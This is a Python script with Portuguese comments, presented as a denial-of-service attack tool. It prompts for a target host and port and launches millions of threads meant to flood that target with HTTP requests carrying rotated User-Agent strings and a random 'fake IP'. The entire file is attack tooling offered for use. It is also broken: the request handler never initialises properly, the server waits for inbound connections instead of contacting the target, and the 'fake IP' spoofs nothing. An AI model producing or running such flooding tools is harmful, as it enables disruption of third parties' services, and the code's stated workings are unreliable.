import socket
import random
import threading
import socketserver
import msvcrt

# Define o tempo limite de conexão em 5 segundos
socket.setdefaulttimeout(5)

class DDoSHandler(socketserver.BaseRequestHandler):
    """Classe para manipular as solicitações de conexão do servidor DDoS."""

    def __init__(self, request, client_address, server):
        """Inicializa a instância da classe com informações sobre a conexão."""
        self.target = server.target
        self.port = server.port
        self.fake_ip = self.get_random_ip()

    def get_random_ip(self):
        """Retorna um endereço IP falso aleatório."""
        return '.'.join(map(str, (random.randint(0, 255) for _ in range(4))))

    def handle(self):
        """Manipula a solicitação de conexão."""
        # Abre uma conexão socket com o alvo
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.target, self.port))

        # Configura o cabeçalho User-Agent
        user_agent_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.3",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
        ]
        user_agent = random.choice(user_agent_list)

        # Envia uma solicitação HTTP falsa para o servidor alvo
        request = "GET /{} HTTP/1.1\r\n".format(self.target)
        request += "Host: {}\r\n".format(self.fake_ip)
        request += "User-Agent: {}\r\n".format(user_agent)
        request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        request += "Accept-Language: en-US,en;q=0.5\r\n"
        request += "Accept-Encoding: gzip, deflate\r\n"
        request += "Connection: close\r\n\r\n"
        s.send(request.encode('ascii'))

        # Fecha a conexão
        s.close()

class DDoSThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    """Classe para inicializar o servidor DDoS."""

    def __init__(self, server_address, RequestHandlerClass, target=None, port=80):
        """Inicializa a instância da classe com informações sobre o servidor."""
        self.target = target
        self.port = port
        socketserver.TCPServer.__init__(self, server_address, RequestHandlerClass)

    def get_random_ip(self):
        """Retorna um endereço IP falso aleatório."""
        return '.'.join(map(str, (random.randint(0, 255) for _ in range(4))))

def main():
    """Função principal do programa."""

    # Exibe uma mensagem de boas-vindas
    print('Bem-vindo ao atacante de DDoS!')

    # Obtém o alvo do usuário
    target = input('Digite o alvo (IP ou nome de domínio): ')

    # Obtém a porta do usuário
    port = int(input('Digite a porta: '))

    # Inicializa as variáveis de controle
    running = False
    attacks = 0

    # Loop principal do programa
    while True:
        # Aguarda a entrada do usuário
        key = msvcrt.getch().decode('ascii')

        # Inicia o ataque
        if key == 'a' and not running:
            # Inicia o servidor DDoS
            server = DDoSThreadedServer(('', 0), DDoSHandler, target, port)

            # Inicia uma thread para manter o servidor em execução
            server_thread = threading.Thread(target=server.serve_forever)
            server_thread.daemon = True
            server_thread.start()

            # Inicia um grande número de threads para atacar o servidor alvo
            for _ in range(5000000):
                threading.Thread(target=server.handle_request).start()

            # Atualiza as variáveis de controle
            running = True
            attacks += 1
            print('Pressione "a" para iniciar outro ataque.')
            print('Alvo: {}'.format(target))
            print('Porta: {}'.format(port))
            print('Pressione "s" para parar o ataque.')
            print('IP falso: {}'.format(server.get_random_ip()))

        # Para o ataque
        elif key == 's' and running:
            # Para o servidor DDoS
            server.shutdown()

            # Atualiza as variáveis de controle
            running = False
            print('Pressione "a" para iniciar o ataque.')
            print('Alvo: {}'.format(target))
            print('Porta: {}'.format(port))
            print('Pressione "s" para parar o ataque.')
            print('Parou o ataque.')

        # Exibe o número de ataques realizados
        elif key == 'p':
            print('Número de ataques realizados: {}'.format(attacks))

        # Sai do loop principal do programa
        elif key == 'q':
            break

if __name__ == '__main__':
    # Chama a função main
    main()